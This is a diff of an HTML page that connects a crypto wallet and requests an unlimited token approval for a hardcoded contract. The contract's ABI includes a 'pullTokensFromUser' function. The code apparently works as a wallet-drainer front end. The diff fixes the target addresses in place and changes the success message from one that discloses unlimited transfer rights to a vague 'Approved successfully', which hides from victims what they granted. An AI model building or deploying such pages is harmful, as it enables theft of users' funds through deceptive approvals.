@@ -2,15 +2,15 @@
 <html>
 <head>
   <title>Wallet Connect + Approve</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
   <button id="connect">Connect Wallet</button>
   <button id="approve">Approve Contract</button>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 
   <script>
-    const CONTRACT_ADDRESS = "0x2aeFA4bbD4134f7B33421c4D87C8C7B4804cEcC1";  // <-- change this
-    const TOKEN_ADDRESS = "0xbea1762935F5C92b6c906b5cdEABB51211067098";        // <-- change this
+    const CONTRACT_ADDRESS = "0x2aeFA4bbD4134f7B33421c4D87C8C7B4804cEcC1";
+    const TOKEN_ADDRESS = "0xbea1762935F5C92b6c906b5cdEABB51211067098";
 
     const ABI = [
       "function pullTokensFromUser(address user, uint256 amount) external",
@@ -40,19 +40,16 @@
 
     document.getElementById("approve").onclick = async () => {
       const maxUint = ethers.BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
-
       try {
+        console.log("Approving...");
         const tx = await token.approve(CONTRACT_ADDRESS, maxUint);
         await tx.wait();
-        alert("Contract approved for unlimited token transfer");
+        alert("Approved successfully");
       } catch (err) {
-        console.error(err);
+        console.error("Approval failed:", err);
         alert("Approval failed");
       }
     };
   </script>
 </body>
 </html>
-
-
-
